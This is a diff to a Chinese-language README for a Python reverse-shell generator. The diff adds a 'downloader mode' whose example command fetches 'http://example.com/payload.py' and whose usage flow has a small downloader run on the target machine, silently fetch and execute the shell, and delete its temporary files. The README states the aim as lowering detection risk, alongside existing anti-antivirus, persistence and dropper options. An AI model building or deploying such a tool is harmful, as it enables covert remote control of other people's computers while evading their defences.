@@ -59,8 +59,13 @@ python3 main.py
 python3 main.py -i 192.168.1.100 -p 4444 --anti-detection --use-dropper
 ```
 
-### 命令行参数
+### 下载器模式
+```bash
+python3 main.py -i 192.168.1.100 -p 4444 --use-downloader --download-url "http://example.com/payload.py" --downloader-silent
 ```
+
+### 命令行参数
+```bash
 -i, --ip              监听IP地址 (必需)
 -p, --port            监听端口 (必需)
 -r, --retry           连接重试次数 (默认: 10)
@@ -71,9 +76,31 @@ python3 main.py -i 192.168.1.100 -p 4444 --anti-detection --use-dropper
 --persistence         添加持久化功能
 --anti-detection      添加反杀毒特征
 --use-dropper         使用分阶段执行模式
+--use-downloader      生成下载器模式
+--download-url        下载地址 (主程序URL)
+--downloader-silent   下载器静默模式
 --quiet               静默模式
 --silent-delay        执行前延迟时间 (默认: 30秒)
 ```
+
+## 功能模式说明
+
+### 🌐 下载器模式
+下载器模式会生成两个Python文件：
+1. **主程序文件** - 包含完整的Shell连接功能
+2. **下载器文件** - 负责从指定URL下载并执行主程序
+
+**使用流程：**
+1. 生成主程序和下载器文件
+2. 将主程序文件上传到Web服务器
+3. 在目标机器上运行下载器文件
+4. 下载器自动下载并执行主程序
+
+**优势：**
+- 分离部署，降低检测风险
+- 下载器体积小，传输方便
+- 支持静默下载和执行
+- 自动清理临时文件
 
 ## 模块说明
 
@@ -100,6 +127,7 @@ python3 main.py -i 192.168.1.100 -p 4444 --anti-detection --use-dropper
 生成最终的Shell文件：
 - `gene_shell()`：标准Shell文件生成
 - `create_payload_dropper()`：分阶段执行文件生成
+- `create_downloader()`：下载器文件生成
 
 ### utils.py - 工具模块
 提供辅助功能：
